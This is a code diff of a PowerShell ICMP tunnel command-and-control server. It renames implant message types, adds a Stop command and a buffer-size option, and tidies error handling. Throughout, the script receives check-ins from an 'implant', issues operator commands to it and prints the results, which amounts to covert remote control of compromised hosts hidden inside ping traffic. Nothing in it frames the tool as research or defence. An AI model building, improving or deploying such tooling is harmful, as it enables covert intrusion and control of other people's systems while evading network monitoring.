@@ -1,10 +1,8 @@
 Import-Module ReadLineWithHistory;
 
-Add-Type 'using System.Collections.Generic;';
-
 enum ImplantMessageType {
   Prompt
-  Empty
+  NeedsInstruction
   CommandResultPart
   CommandResultEnd
 }
@@ -12,6 +10,7 @@ enum ImplantMessageType {
 enum ServerMessageType {
   NeedsPrompt
   IssuingCommand
+  Stop
 }
 
 enum ServerState {
@@ -31,7 +30,11 @@ function Start-ICMPTunnelServer {
     [Parameter()]
     [Alias("IP")]
     [IPAddress]
-    $IPAddress = "0.0.0.0"
+    $IPAddress = "0.0.0.0",
+
+    [Parameter()]
+    [Int32]
+    $BufferSize = 65535
   )
 
   If ($IsLinux) {
@@ -43,20 +46,13 @@ using System.Runtime.InteropServices;
 public static class LIBC
 {
   [DllImport("libc.so.6")]
-  public static extern uint getpid();
-  [DllImport("libc.so.6")]
-  public static extern uint getuid();
-  [DllImport("libc.so.6")]
   public static extern uint geteuid();
-  [DllImport("libc.so.6")]
-  public static extern int seteuid(uint uid);
-
 }
 '@;
     }
     If ([LIBC]::geteuid() -ne 0) {
-      Write-Host "This program must be run as root to intercept ICMP packets."
-      exit;
+      Write-Host "This program must be run as root to intercept ICMP packets.";
+      Return;
     }
   }
 
@@ -66,8 +62,8 @@ public static class LIBC
   }
   Catch {
     If ($_.Exception.InnerException.ErrorCode -eq 13) {
-      Write-Host "Permission to intercept ICMP packets was denied. Try again with root or admin permissions."
-      exit;
+      Write-Host "Permission to intercept ICMP packets was denied. Try again with root or admin permissions.";
+      Return;
     }
   }
   $ICMPSocket.SetSocketOption([Net.Sockets.SocketOptionLevel]::Socket, [Net.Sockets.SocketOptionName]::ReceiveTimeout, 10);
@@ -81,14 +77,14 @@ public static class LIBC
     # .Description
     # Checks for an ICMP Echo Request from anyone and returns the ICMP header, ImplantMessageType, message data, and the IPEndpoint. 
 
-    $Buffer = New-Object Byte[] ($ICMPSocket.ReceiveBufferSize);
+    $Buffer = New-Object Byte[] ($BufferSize);
     $Endpoint = New-Object Net.IPEndpoint([Net.IPAddress]::Any, 0);
     $IPPacketInformation = New-Object Net.Sockets.IPPacketInformation;
 
     $ByteCount = 0;
     try {
       # Checking for an ICMP packet from any IP.
-      $ByteCount = $ICMPSocket.ReceiveMessageFrom($Buffer, 0, $ICMPSocket.ReceiveBufferSize, [ref][System.Net.Sockets.SocketFlags]::None, [ref]$Endpoint, [ref]$IPPacketInformation);
+      $ByteCount = $ICMPSocket.ReceiveMessageFrom($Buffer, 0, $BufferSize, [ref][System.Net.Sockets.SocketFlags]::None, [ref]$Endpoint, [ref]$IPPacketInformation);
     }
     catch { return $null; }
     if ($ByteCount -eq 0) { return $null; }
@@ -163,7 +159,7 @@ public static class LIBC
             $State = EnteringCommand;
             Break;
           }
-          Empty {
+          NeedsInstruction {
             Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType NeedsPrompt;
             Break;
           }
@@ -179,7 +175,7 @@ public static class LIBC
       ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
         if ($null -eq $ICMPHeader) { Continue; }
         Switch ($MessageType) {
-          Empty {
+          NeedsInstruction {
             Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType IssuingCommand -Command $CommandToSend;
             $State = ReceivingCommandResult;
             Break;
@@ -189,6 +185,7 @@ public static class LIBC
       }
       ReceivingCommandResult {
         ($ICMPHeader, $MessageType, $MessageData, $Endpoint) = Receive-ICMPMessage;
+        if ($null -eq $ICMPHeader) { Continue; }
         Switch ($MessageType) {
           CommandResultPart {
             Write-Host -NoNewline ([Text.Encoding]::UTF8.GetString($MessageData));
